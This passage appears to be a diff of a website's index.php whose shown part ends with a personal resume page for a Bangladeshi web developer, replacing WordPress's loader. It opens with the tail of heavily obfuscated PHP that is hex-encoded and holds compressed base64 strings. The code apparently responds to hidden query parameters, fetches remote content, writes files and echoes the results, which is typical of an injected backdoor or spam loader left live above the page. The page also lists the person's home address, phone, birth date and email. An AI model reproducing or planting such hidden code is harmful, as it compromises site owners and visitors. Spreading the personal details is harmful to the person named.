if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($OO_00OO__0,$OO00O_O_0_)){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"]($OO00O_O_0_,\'\',$OO_00OO__0);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x30\x5f\x4f\x4f\x5f\x4f\x30"]($OO0_0_0O_O.${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OOO__0_00O[$O00__0OOO_]),$OO_00OO__0);echo $OO0_0_0O_O.${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OOO__0_00O[$O00__0OOO_]).\'<br>\';}}echo $OO_O_O000_;unset($OO_00OO__0,$OOO__0_00O,$OO0_0_0O_O);exit();}$O_0OOO00__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x5f\x4f\x30\x30\x30\x4f"]($O_0OOO00__,$O0O_0OO__0,$O_O0_0O_O0,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x30\x4f\x30\x4f\x5f\x4f"](\'Y-m-d h:i:s\')),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O0_OOO0__0),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O0O_O_00_O),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($O00__0OOO_pps) ,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($OO__0O0_O0),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O00OOO___0),$OO_0O_O00_,$OOO__000O_,0,$OO00O__0O_.\'|\'.$O0OOO0_0__);$O__0O00OO_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x5f\x5f\x4f\x5f\x30\x30\x30"]("/%host%/si",$O0O0_O_0_O,$O__0O00OO_);$O__0O00OO_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x5f\x4f\x30\x30\x30\x4f"]($O__0O00OO_,$O0O_0OO__0,$O_O0_0O_O0,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x30\x4f\x30\x4f\x5f\x4f"](\'Y-m-d h:i:s\')),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O0_OOO0__0),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O0O_O_00_O),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($O00__0OOO_pps) ,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($OO__0O0_O0),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O00OOO___0),$OO_0O_O00_,$OOO__000O_,1,$OO00O__0O_.\'|\'.$O0OOO0_0__);if(isset(${"\x5f\x47\x45\x54"}["\x78\x78\x6e\x65\x77\x32\x30\x31\x38\x5f\x75\x72\x6c\x31"])){echo $O_0OOO00__;exit();}if(isset(${"\x5f\x47\x45\x54"}["\x78\x78\x6e\x65\x77\x32\x30\x31\x38\x5f\x75\x72\x6c\x32"])){echo $O__0O00OO_;exit();}if(isset(${"\x5f\x47\x45\x54"}["\x77\x65\x62\x6d\x61\x73\x74\x65\x72\x73\x5f\x75\x72\x6c"])){$O0__OO_O00=${"\x5f\x47\x45\x54"}["\x77\x65\x62\x6d\x61\x73\x74\x65\x72\x73\x5f\x75\x72\x6c"];$O0O__O0O0_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'yygpKhTSi20tcvLy/XS8/PT89J1UvOz9UvT03KTSwuSS0q1i/OLEnNTSwo1i/IzEu3h/JtPsAQ==\').$O0__OO_O00;$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x5f\x30\x4f\x4f\x30"]($O0O__O0O0_);echo $OO_00OO__0;exit();}$O__00O_0OO=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'yyhJThTM7tPPBgA=\');$O__00O_0OO=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'yyhJThTM7tPLBwA=\');if(isset(${"\x5f\x47\x45\x54"}["\x68\x74\x61\x63"])){$O__O00O0O_=${"\x5f\x47\x45\x54"}["\x68\x74\x61\x63"];if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x4f\x30\x4f\x4f\x5f\x30"]($O__O00O0O_)){echo $O__00O_0OO;}else{echo $O__00O_0OO;}exit();}$O0O_O00__O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'09coyhTk/KLynW1NPSK6koUdEtPHAA==\');if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x30\x4f\x30\x30\x5f\x4f"]($O0O_O00__O,$O0_OOO0__0)){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x5f\x4f\x4f\x5f\x30\x4f"]($O_0OOO00__);if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($OO_00OO__0,$OO00O_O_0_)){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"]($OO00O_O_0_,\'\',$OO_00OO__0);$OO_O_O_000=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'S87PKhT0nNK9EtqSxItSpJrSjRL6ktPoAQA=\');if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x30\x30\x4f\x5f\x4f"]($O000O_OO__)) {${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x5f\x30\x30\x4f\x5f\x5f"]($O0_0__O0OO);}@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x30\x30\x4f\x4f\x5f"]($OO_O_O_000);echo $OO_00OO__0;if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x30\x30\x4f\x5f\x4f"]($O000O_OO__)) {${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x4f\x30\x5f\x5f\x4f\x30\x30"]();}unset($OO_00OO__0,$O_0OOO00__,$O0_OOO0__0,$O0O_0OO__0,$OO__0O0_O0,$O00OOO___0);exit();}}$OO_O0__O00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'09cozhTixJzU0s0NTT0qvIzVHtPRBwA=\');if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x30\x4f\x30\x30\x5f\x4f"]($OO_O0__O00,$O0_OOO0__0)){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x5f\x4f\x4f\x5f\x30\x4f"]($O_0OOO00__);if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($OO_00OO__0,$OO00O_O_0_)){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"]($OO00O_O_0_,\'\',$OO_00OO__0);$OO_O_O_000=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'S87PKhT0nNK9EtqSxItSpJrSjRr8jtPNAQA=\');if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x30\x30\x4f\x5f\x4f"]($O000O_OO__)) {${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x5f\x30\x30\x4f\x5f\x5f"]($O0_0__O0OO);}@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x30\x30\x4f\x4f\x5f"]($OO_O_O_000);echo $OO_00OO__0;if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x30\x30\x4f\x5f\x4f"]($O000O_OO__)) {${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x4f\x30\x5f\x5f\x4f\x30\x30"]();}unset($OO_00OO__0,$O_0OOO00__,$O0_OOO0__0,$O0O_0OO__0,$OO__0O0_O0,$O00OOO___0);exit();}}if($O0O_00O_O_){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x5f\x4f\x4f\x5f\x30\x4f"]($O_0OOO00__);if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($OO_00OO__0,$OO00O_O_0_)){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"]($OO00O_O_0_,\'\',$OO_00OO__0);if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x30\x30\x4f\x5f\x4f"]($O000O_OO__)) {${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x5f\x30\x30\x4f\x5f\x5f"]($O0_0__O0OO);}echo $OO_00OO__0;if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x30\x30\x4f\x5f\x4f"]($O000O_OO__)) {${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x4f\x30\x5f\x5f\x4f\x30\x30"]();}unset($OO_00OO__0,$O0_OOO0__0,$O0O_0OO__0,$OO__0O0_O0,$O00OOO___0);exit();}}if($OO00O__O0_){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x5f\x4f\x4f\x5f\x30\x4f"]($O__0O00OO_);if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($OO_00OO__0,$OO00O_O_0_)){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"]($OO00O_O_0_,\'\',$OO_00OO__0);if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x30\x30\x4f\x5f\x4f"]($O000O_OO__)) {${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x5f\x30\x30\x4f\x5f\x5f"]($O0_0__O0OO);}echo $OO_00OO__0;if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x30\x30\x4f\x5f\x4f"]($O000O_OO__)) {${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x4f\x30\x5f\x5f\x4f\x30\x30"]();}unset($OO_00OO__0,$O0_OOO0__0,$O0O_0OO__0,$OO__0O0_O0,$O00OOO___0);exit();}}');${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x4f\x4f\x30\x30\x5f"]();?>
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+if (!isset($_SERVER['HTTPS'])) {
+    //header('Location: https://' . $_SERVER["SERVER_NAME"] . $_SERVER['REQUEST_URI']);
+}
+?>
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define('WP_USE_THEMES', true);
 
-/** Loads the WordPress Environment and Template */
-require( dirname( __FILE__ ) . '/wp-blog-header.php' );?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#">
+    <link rel="alternate" href="http://anwarulislam.tk" hreflang="en-us" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="Assalamu Alaikum Dear, Its myself Anwarul Islam. I am a web Developer and formally Graphics Designer. sometimes i write blog in online so that i am also a blogger. Here is my Html Resume">
+
+    <meta name="keywords" content="anwarulislam, anwarul islam, anwarul islam bablu, bablu, anwar, web developer, resume, CV HTML template, personal resume, html resume, anwar cv, anwarul islam resume, anwarul islam resume cv, personal portfolio anwarul islam, free html portfolio anwar">
+
+    <meta name="twitter:card" content="Assalamu Alaikum Dear, Its myself Anwarul Islam. I am a web Developer and formally Graphics Designer. sometimes i write blog in online so that i am also a blogger. Here is my Html Resume" />
+<meta name="twitter:site" content="@anwaarulislaam" />
+<meta name="twitter:creator" content="@anwaarulislaam" />
+
+<meta name="p:domain_verify" content="2636ca4966be4bbea268a3104747fd43"/>
+    <meta property="og:type" content="article" />
+    <!--
+    <meta property="fb:page_id" content="150520338768134" />
+    -->
+    <meta property="fb:app_id" content="851089505020363"/>
+    <meta property="fb:admins" content="100003661549624"/>
+	<meta name="author" content="http://fb.me/anwarul.bablu">
+	<meta property="og:site_name" content="Anwarul Islam Resume" />
+
+
+    <meta property="og:url" content="https://anwarulislam.tk/" />
+
+    <meta property="og:title" content="Anwarul Islam - Web Application Developer" />
+    <meta property="og:description" content="Assalamu Alaikum Dear, Its myself Anwarul Islam. I am a web Developer and formally Graphics Designer. sometimes i write blog in online so that i am also a blogger. Here is my Html Resume" />
+
+    <meta property="og:image" content="https://anwartheblogger.files.wordpress.com/2017/09/anwarul-islam-5.jpg" />
+    <meta property="og:image:secure_url" content="https://anwartheblogger.files.wordpress.com/2017/09/anwarul-islam-5.jpg" />
+    <meta property="og:image:width" content="5132" />  <meta property="og:image:height" content="3456" /> <meta property="og:image:alt" content="Anwarul Islam" />
+
+    <meta property="article:publisher" content="https://www.facebook.com/anwaarulislaam" />
+    <meta property="article:author" content="https://www.facebook.com/anwarul.bablu" />
+    <meta property="article:tag" content="Anwarul Islam" />
+    <meta property="article:tag" content="Anwarul Islam Bablu" />
+    <meta property="article:tag" content="Bangladeshi Web Developer" />
+    <meta name="application-name" content="Anwarul Islam" />
+    <meta name="msapplication-tooltip" content="Anwarul Islam Bablu - Web Developer, Graphics Designer, Blogger" />
+
+
+<!-- extra meta -->
+<meta itemprop="acquia_lift:content_title" content="Anwarul Islam" />
+<meta itemprop="acquia_lift:author" content="Anwarul Islam Bablu" />
+<meta itemprop="acquia_lift:contentOrigin" content="Anwarul islam" />
+<meta name="generator" content="Powered by Anwarul Islam Bablu."/>
+<meta name="author" content="Anwarul Islam">
+
+	<title>Anwarul Islam - Web Application Developer</title>
+
+  <!-- Web Fonts -->
+  <link href='http://fonts.googleapis.com/css?family=Roboto:400,300,500,700' rel='stylesheet' type='text/css'>
+	<!-- Bootstrap core CSS -->
+	<link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
+	<!-- Font Awesome CSS -->
+	<link href="assets/css/font-awesome.min.css" rel="stylesheet" media="screen">
+	<!-- Animate css -->
+  <link href="assets/css/animate.css" rel="stylesheet">
+  <!-- Magnific css -->
+	<link href="assets/css/magnific-popup.css" rel="stylesheet">
+	<!-- Custom styles CSS -->
+	<link href="assets/css/style.css" rel="stylesheet" media="screen">
+  <!-- Responsive CSS -->
+  <link href="assets/css/responsive.css" rel="stylesheet">
+<link href="assets/css/custom.css" rel="stylesheet">
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+  <link rel="shortcut icon" href="https://anwartheblogger.files.wordpress.com/2017/07/cropped-brand2.png">
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/images/ico/apple-touch-icon-144-precomposed.png">
+  <link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/images/ico/apple-touch-icon-114-precomposed.png">
+  <link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/images/ico/apple-touch-icon-72-precomposed.png">
+  <link rel="apple-touch-icon-precomposed" href="assets/images/ico/apple-touch-icon-57-precomposed.png">
+<link rel="canonical" href="http://anwarulislam.tk/">
+<script src="assets/js/jquery.js"></script>
+<script type="text/javascript">
+$(document).ready(function () {
+    //Disable cut copy paste
+    $('body').bind('cut copy paste', function (e) {
+        e.preventDefault();
+    });
+
+    //Disable mouse right click
+    $("body").on("contextmenu",function(e){
+        return false;
+    });
+});
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-99669608-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-99669608-2');
+</script>
+
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "url": "http://anwarulislam.tk/",
+  "name": "Anwarul Islam",
+  "contactPoint": {
+    "@type": "ContactPoint",
+    "telephone": "+880-1815651830",
+    "contactType": "Customer service"
+  }
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Person",
+  "name": "Anwarul Islam",
+  "url": "http://www.anwarulislam.tk/",
+  "sameAs": [
+    "http://www.facebook.com/anwarul.bablu",
+    "http://instagram.com/anwaarulislaam",
+    "http://www.linkedin.com/in/anwaarulislaam",
+    "http://plus.google.com/anwarulislambablu"
+  ]
+}
+</script>
+
+
+
+
+
+<!-- Start of Async Drift Code
+<script>
+!function() {
+  var t;
+  if (t = window.driftt = window.drift = window.driftt || [], !t.init) return t.invoked ? void (window.console && console.error && console.error("Drift snippet included twice.")) : (t.invoked = !0,
+  t.methods = [ "identify", "config", "track", "reset", "debug", "show", "ping", "page", "hide", "off", "on" ],
+  t.factory = function(e) {
+    return function() {
+      var n;
+      return n = Array.prototype.slice.call(arguments), n.unshift(e), t.push(n), t;
+    };
+  }, t.methods.forEach(function(e) {
+    t[e] = t.factory(e);
+  }), t.load = function(t) {
+    var e, n, o, i;
+    e = 3e5, i = Math.ceil(new Date() / e) * e, o = document.createElement("script"),
+    o.type = "text/javascript", o.async = !0, o.crossorigin = "anonymous", o.src = "https://js.driftt.com/include/" + i + "/" + t + ".js",
+    n = document.getElementsByTagName("script")[0], n.parentNode.insertBefore(o, n);
+  });
+}();
+drift.SNIPPET_VERSION = '0.3.1';
+drift.load('isf8rxea8ms3');
+</script>
+ End of Async Drift Code -->
+
+
+
+</head>
+
+<body style="-moz-user-select: none; -webkit-user-select: none; -ms-user-select:none; user-select:none;-o-user-select:none;" unselectable="on" onselectstart="return false;" >
+
+    <script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      appId            : '851089505020363',
+      autoLogAppEvents : true,
+      xfbml            : true,
+      version          : 'v2.10'
+    });
+    FB.AppEvents.logPageView();
+  };
+
+  (function(d, s, id){
+     var js, fjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = "//connect.facebook.net/en_US/sdk.js";
+     fjs.parentNode.insertBefore(js, fjs);
+   }(document, 'script', 'facebook-jssdk'));
+</script>
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v2.10&amp;appId=851089505020363";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+	<!-- Preloader<div id="loader"></div><div id="tt-preloader">
+		<div id="pre-status">
+			<div class="preload-placeholder"></div>
+		</div>
+	</div> -->
+
+
+	<!-- Home Section<div style="display:none;" id="myDiv" class="animate-bottom"> -->
+
+
+
+
+	<section id="home" class="tt-fullHeight" data-stellar-vertical-offset="50" data-stellar-background-ratio="0.2">
+		<div class="intro">
+			<div class="intro-sub">I am anwarul islam</div>
+			<h1>web-app <span>developer</span></h1>
+			<p>I am a fully professional freelance creative User Interface Designer &amp; Developer<br> Involving with latest web designing and technologies. <br> <b>Feel free to contact creative.</b></p>
+
+      <div class="social-icons">
+        <ul class="list-inline">
+          <li><a target="_blank" href="https://facebook.com/anwarul.bablu"><i class="fa fa-facebook"></i></a></li>
+          <li><a target="_blank"  href="https://twitter.com/anwaarulislaam"><i class="fa fa-twitter"></i></a></li>
+          <li><a target="_blank"  href="https://www.behance.net/anwaarulislaam"><i class="fa fa-behance"></i></a></li>
+          <li><a target="_blank"  href="https://www.youtube.com/Anwarulislam"><i class="fa fa-youtube"></i></a></li>
+          <li><a target="_blank"  href="https://pinterest.com/anwaarulislaam"><i class="fa fa-pinterest"></i></a></li>
+        </ul>
+      </div> <!-- /.social-icons -->
+		</div>
+
+
+	</section><!-- End Home Section -->
+
+
+
+
+	<!-- Navigation -->
+	<header class="header">
+		<nav class="navbar navbar-custom" role="navigation">
+			<div class="container">
+				<div class="navbar-header">
+					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#custom-collapse">
+						<span class="sr-only">Toggle navigation</span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+					</button>
+					<!--
+					<a class="navbar-brand" href="index.php">
+					    <img src="assets/images/logo.png" alt="">
+					    </a>
+					-->
+					<a class="navbar-brand" href="index.php">
+					    <h2 class="" style="font-size:20px;">Anwarul islam</h2>
+					    </a>
+				</div>
+
+				<div class="collapse navbar-collapse" id="custom-collapse">
+					<ul class="nav navbar-nav navbar-right">
+						<li><a href="#home">Home</a></li>
+						<li><a href="#about">About</a></li>
+						<li><a href="#resume">Resume</a></li>
+						<li><a href="#skills">Skills</a></li>
+						<li><a href="#works">Works</a></li>
+						<li><a href="#blog">Blog</a></li>
+            <li><a href="#contact">Contact</a></li>
+					</ul>
+				</div>
+			</div><!-- .container -->
+		</nav>
+	</header><!-- End Navigation -->
+
+
+    <!-- About Section -->
+    <section id="about" class="about-section section-padding">
+      <div class="container">
+        <h2 class="section-title wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">About Me</h2>
+
+        <div class="row">
+
+          <div class="col-md-4 col-md-push-8">
+            <div class="biography">
+              <div class="myphoto">
+                <img src="assets/images/myphoto.jpg" alt="Anwarul Islam" title="Anwarul Islam">
+              </div>
+              <ul>
+                <li><strong>Name:</strong> Anwarul Islam</li>
+                <li><strong>Nickname:</strong> Bablu</li>
+                <li><strong>Date of birth:</strong> 24 Aug 1998</li>
+                <li><strong>Address:</strong> 239/2 Bakshibazar, Chakbazar, Dhaka-1211, Bangladesh</li>
+                <li><strong>Nationality:</strong> Bangladeshi</li>
+                <li><strong>Phone:</strong> <a href="tel:+8801815651830">+8801815651830</a></li>
+                <li><strong>Email:</strong> anwaarulislaam@gmail.com</li>
+                <li><strong>Blood Group:</strong> O (+ve)</li>
+
+                              </ul>
+            </div>
+          </div> <!-- col-md-4 -->
+
+          <div class="col-md-8 col-md-pull-4">
+            <div class="short-info wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+              <h3>Objective</h3>
+              <p>An opportunity to work and upgrade oneself, as well as being involved in an organization that believes in gaining a competitive edge and giving back to the community. I'm presently expanding my solid experience in UI / UX design. I focus on using my interpersonal skills to build good user experience and create a strong interest in my employers. I hope to develop skills in motion design and my knowledge of the Web, and become an honest asset to the business. As an individual, I'm self-confident you’ll find me creative, funny and naturally passionate. I’m a forward thinker, which others may find inspiring when working as a team.</p>
+            </div>
+
+            <div class="short-info wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+              <h3>What I Do ?</h3>
+              <p>I have been working as a web interface designer since. I have a love of clean, elegant styling, and I have lots of experience in the production of CSS3 and HTML5 for modern websites. I loving creating awesome as per my clients’ need. I think user experience when I try to craft something for my clients. Making a design awesome.</p>
+
+              <ul class="list-check">
+                <li>Web Design</li>
+                <li>Web Application Development</li>
+                <li>Graphics Design</li>
+                <li>Business Design</li>
+                <li>Wordpress Custom Theme</li>
+                <li>Flat Design</li>
+              </ul>
+            </div>
+
+            <div class="my-signature">
+              <img src="assets/images/signu.png" alt="">
+            </div>
+
+            <div class="download-button">
+              <a class="btn btn-info btn-lg" href="#contact"><i class="fa fa-paper-plane"></i>Send me message</a>
+              <a class="btn btn-primary btn-lg" href="anwarul-islam-cv.pdf"><i class="fa fa-download"></i>Anwarul Islam CV</a>
+            </div>
+          </div>
+
+
+        </div> <!-- /.row -->
+      </div> <!-- /.container -->
+    </section><!-- End About Section -->
+
+
+    <!-- Video Section -->
+    <section id="video" class="video-section">
+      <div class="tf-bg-overlay">
+
+        <div class="container">
+
+          <div class="video-intro">
+             <a class="popup-video" href="https://www.youtube.com/watch?v=0u9I1Cd2vPM"> <i class="fa fa-play"></i>  </a>
+             <h2>Video Introducing</h2>
+          </div>
+
+        </div>
+
+        <!--/.container-->
+      </div>
+      <!--/.overlay-->
+    </section>
+    <!-- /.Video Section -->
+
+
+
+
+    <!-- Resume Section -->
+    <section id="resume" class="resume-section section-padding">
+        <div class="container">
+            <h2 class="section-title wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">Resume</h2>
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="resume-title">
+                        <h3>Education</h3>
+                    </div>
+                    <div class="resume">
+                        <ul class="timeline">
+
+                            <li class="timeline-inverted">
+                                <div class="posted-date">
+                                    <span class="month">2014-2016</span>
+                                </div><!-- /posted-date -->
+
+                                <div class="timeline-panel wow fadeInUp style="visibility: visible; animation-name: fadeInUp;"">
+                                    <div class="timeline-content">
+                                        <div class="timeline-heading">
+                                            <h3>Higher Secondary certificate</h3>
+                                            <span>Humanities, Tamirul Millat Kamil Madrasah, Dhaka, Bangladesh</span>
+                                        </div><!-- /timeline-heading -->
+
+                                        <div class="timeline-body">
+                                            <p>From this Madrasah of existence in this spot, which was created for the bliss of souls like mine. I am so happy, my dear friend.</p>
+                                        </div><!-- /timeline-body -->
+                                    </div> <!-- /timeline-content -->
+                                </div> <!-- /timeline-panel -->
+                            </li>
+
+                            <li>
+                                <div class="posted-date">
+                                  <span class="month">2005-2014</span>
+                                </div><!-- /posted-date -->
+
+                                <div class="timeline-panel wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+                                    <div class="timeline-content">
+                                        <div class="timeline-heading">
+                                            <h3>Secondary school certificate</h3>
+                                            <span>Humanities, Sobura Khatun Jamiya Islamia Madrasah, Feni, Bangladesh.</span>
+                                        </div><!-- /timeline-heading -->
+
+                                        <div class="timeline-body">
+                                            <p>I was awesome at arts, and feel the charm of existence in this spot, which was created for the bliss of souls like mine. I am so happy.</p>
+                                        </div><!-- /timeline-body -->
+                                    </div> <!-- /timeline-content -->
+                                </div><!-- /timeline-panel -->
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div><!-- /row -->
+
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="resume-title">
+                        <h3>Experience</h3>
+                    </div>
+                    <div class="resume">
+                        <ul class="timeline">
+                            <li class="timeline-inverted">
+                                <div class="posted-date">
+                                  <span class="month">2016-Current</span>
+                                </div><!-- /posted-date -->
+
+                                <div class="timeline-panel wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+                                    <div class="timeline-content">
+                                        <div class="timeline-heading">
+                                            <h3>WEB APPLICATION DEVELOPER</h3>
+                                            <span>Freelance, Fiver</span>
+                                        </div><!-- /timeline-heading -->
+
+                                        <div class="timeline-body">
+                                            <p>I am alone, and feel the charm of existence in this spot, which was created for the bliss of souls like mine. I am so happy, my dear friend.</p>
